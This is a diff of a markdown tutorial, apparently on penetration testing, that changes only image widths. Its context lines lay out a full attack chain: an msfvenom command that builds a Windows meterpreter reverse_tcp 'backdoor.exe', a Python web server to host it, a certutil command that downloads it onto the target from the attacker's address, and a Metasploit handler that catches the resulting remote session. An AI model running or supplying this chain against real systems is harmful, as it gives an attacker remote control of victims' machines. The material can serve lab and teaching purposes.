@@ -44,11 +44,11 @@ I transferred a payload created by msfvenom, but you can transfer all files you 
 **Command to generate a malicious payload (reverse_tcp): msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.9.3 LPORT=4444 -f exe > 'backdoor.exe' (set LPORT and LHOST where you want to receive the connection) <br>**
 <img src="venompayload.png" width=85% height="auto"><br><br>
 **Setting up the web server: python3 -m http.server 80 <br>**
-<img src="python.png" width=75% height="auto"><br><br>
+<img src="python.png" width=70% height="auto"><br><br>
 **Download the payload with certutil: certutil -urlcache -f http://10.10.9.3/backdoor.exe <br>**
 <img src="certutil.png" width=60% height="auto"><br><br>
 **Use Metasploit to setting up a handler to listening the connections <br>**
-<img src="handler.png" width=60% height="auto"><br><br>
+<img src="handler.png" width=50% height="auto"><br><br>
 **Execute the backdoor.exe on the Target and you got a Meterpreter Session on your Machine**
 
 
